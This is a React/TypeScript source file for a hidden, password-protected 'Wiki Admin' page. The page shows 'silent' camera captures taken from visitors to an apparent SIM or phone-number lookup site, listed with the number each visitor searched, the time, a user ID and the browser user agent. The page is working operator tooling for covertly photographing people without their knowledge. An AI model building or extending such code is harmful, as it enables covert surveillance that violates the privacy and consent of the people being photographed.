import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { useServerFn } from "@tanstack/react-start";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { toast } from "sonner";
import { Camera, Trash2, RefreshCw, LogOut, ShieldCheck, Lock } from "lucide-react";
import {
  wikiLogin,
  wikiLogout,
  wikiCheckSession,
  wikiListCaptures,
  wikiDeleteCapture,
  type WikiCaptureRow,
} from "@/lib/wiki-admin.functions";

export const Route = createFileRoute("/wiki-admin")({
  component: WikiAdminPage,
  head: () => ({
    meta: [
      { title: "Wiki Admin" },
      { name: "robots", content: "noindex, nofollow" },
    ],
  }),
});

function WikiAdminPage() {
  const check = useServerFn(wikiCheckSession);
  const [ready, setReady] = useState(false);
  const [unlocked, setUnlocked] = useState(false);

  useEffect(() => {
    check().then((r) => {
      setUnlocked(r.unlocked);
      setReady(true);
    }).catch(() => setReady(true));
  }, []);

  if (!ready) {
    return <div className="flex min-h-screen items-center justify-center text-muted-foreground">Loading…</div>;
  }
  if (!unlocked) return <LoginForm onSuccess={() => setUnlocked(true)} />;
  return <CapturesView onLogout={() => setUnlocked(false)} />;
}

function LoginForm({ onSuccess }: { onSuccess: () => void }) {
  const login = useServerFn(wikiLogin);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    try {
      const r = await login({ data: { email, password } });
      if (r.ok) {
        toast.success("Welcome");
        onSuccess();
      } else {
        toast.error("Invalid credentials");
      }
    } catch {
      toast.error("Login failed");
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-secondary/30 p-4">
      <Card className="w-full max-w-md p-6">
        <div className="mb-6 flex items-center gap-3">
          <div className="rounded-full bg-primary/15 p-3 text-primary">
            <Lock className="h-6 w-6" />
          </div>
          <div>
            <h1 className="text-xl font-bold">Wiki Admin</h1>
            <p className="text-xs text-muted-foreground">Private capture viewer</p>
          </div>
        </div>
        <form onSubmit={onSubmit} className="space-y-3">
          <div>
            <label className="text-xs font-medium">Email</label>
            <Input
              type="email"
              autoComplete="username"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
          </div>
          <div>
            <label className="text-xs font-medium">Password</label>
            <Input
              type="password"
              autoComplete="current-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </div>
          <Button type="submit" className="w-full" disabled={busy}>
            {busy ? "Signing in…" : "Sign in"}
          </Button>
        </form>
      </Card>
    </div>
  );
}

function CapturesView({ onLogout }: { onLogout: () => void }) {
  const list = useServerFn(wikiListCaptures);
  const del = useServerFn(wikiDeleteCapture);
  const logout = useServerFn(wikiLogout);
  const [rows, setRows] = useState<WikiCaptureRow[]>([]);
  const [loading, setLoading] = useState(true);

  async function load() {
    setLoading(true);
    try {
      const r = await list();
      setRows(r);
    } catch (e: any) {
      toast.error(e?.message ?? "Failed");
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    load();
    const t = setInterval(load, 20000);
    return () => clearInterval(t);
  }, []);

  async function remove(row: WikiCaptureRow) {
    if (!confirm("Delete this capture?")) return;
    try {
      await del({ data: { id: row.id, storage_path: row.storage_path } });
      toast.success("Deleted");
      setRows((r) => r.filter((x) => x.id !== row.id));
    } catch (e: any) {
      toast.error(e?.message ?? "Delete failed");
    }
  }

  async function doLogout() {
    await logout();
    onLogout();
  }

  return (
    <div className="min-h-screen bg-secondary/30 p-4 sm:p-8">
      <div className="mx-auto max-w-6xl space-y-6">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center gap-3">
            <div className="rounded-full bg-red-500/15 p-3 text-red-500">
              <ShieldCheck className="h-6 w-6" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Wiki Admin — Captures</h1>
              <p className="text-sm text-muted-foreground">
                Silent SIM-database camera captures. {rows.length} total.
              </p>
            </div>
          </div>
          <div className="flex gap-2">
            <Button variant="outline" onClick={load} disabled={loading}>
              <RefreshCw className="mr-2 h-4 w-4" /> Refresh
            </Button>
            <Button variant="ghost" onClick={doLogout}>
              <LogOut className="mr-2 h-4 w-4" /> Logout
            </Button>
          </div>
        </div>

        {loading && rows.length === 0 ? (
          <p className="text-sm text-muted-foreground">Loading…</p>
        ) : rows.length === 0 ? (
          <div className="rounded-xl border bg-card p-8 text-center text-sm text-muted-foreground">
            <Camera className="mx-auto mb-2 h-8 w-8 opacity-50" />
            No captures yet.
          </div>
        ) : (
          <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">
            {rows.map((r) => (
              <div key={r.id} className="overflow-hidden rounded-xl border bg-card">
                {r.signed_url ? (
                  <img src={r.signed_url} alt="capture" className="h-56 w-full object-cover" />
                ) : (
                  <div className="flex h-56 w-full items-center justify-center bg-muted text-xs text-muted-foreground">
                    Image unavailable
                  </div>
                )}
                <div className="space-y-1 p-3 text-xs">
                  <div className="text-sm font-semibold">
                    {r.searched_number ? `📞 ${r.searched_number}` : "— page open —"}
                  </div>
                  <div className="text-muted-foreground">
                    {new Date(r.created_at).toLocaleString()}
                  </div>
                  <div className="truncate text-muted-foreground">
                    {r.user_id ? `User: ${r.user_id.slice(0, 8)}…` : "Guest"}
                  </div>
                  <div className="truncate text-muted-foreground" title={r.user_agent ?? ""}>
                    {r.user_agent}
                  </div>
                  <Button
                    variant="destructive"
                    size="sm"
                    className="mt-2 w-full"
                    onClick={() => remove(r)}
                  >
                    <Trash2 className="mr-2 h-3.5 w-3.5" /> Delete
                  </Button>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
